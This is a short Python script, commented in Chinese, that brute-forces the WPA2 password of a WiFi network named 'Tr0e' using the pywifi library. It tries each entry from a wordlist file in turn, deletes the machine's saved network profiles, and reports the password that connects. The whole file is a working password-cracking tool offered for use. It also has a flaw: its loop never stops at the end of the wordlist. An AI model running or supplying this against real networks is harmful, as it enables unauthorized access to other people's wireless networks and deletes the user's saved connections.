import pywifi
from pywifi import const
import time
import datetime


# 测试连接，返回链接结果
def wifiConnect(pwd):
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        profile.ssid = "Tr0e"
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码
        profile.key = pwd
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(2)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")


# 读取密码本
def readPassword():
    success = False
    print("****************** WIFI破解 ******************")
    # 密码本路径
    path = "pwd.txt"
    # 打开文件
    file = open(path, "r")
    start = datetime.datetime.now()
    while True:
        try:
            pwd = file.readline()
            # 去除密码的末尾换行符
            pwd = pwd.strip('\n')
            bool = wifiConnect(pwd)
            if bool:
                print("[*] 密码已破解：", pwd)
                print("[*] WiFi已自动连接！！！")
                success = True
                break
            else:
                # 跳出当前循环，进行下一次循环
                print("正在破解 SSID 为 %s 的 WIFI密码，当前校验的密码为：%s"%("Tr0e",pwd))
        except:
            continue
    end = datetime.datetime.now()
    if(success):
        print("[*] 本次破解WIFI密码一共用了多长时间：{}".format(end - start))
    else:
        print("[*] 很遗憾未能帮你破解出当前指定WIFI的密码，请更换密码字典后重新尝试！")
    exit(0)


if __name__=="__main__":
    readPassword()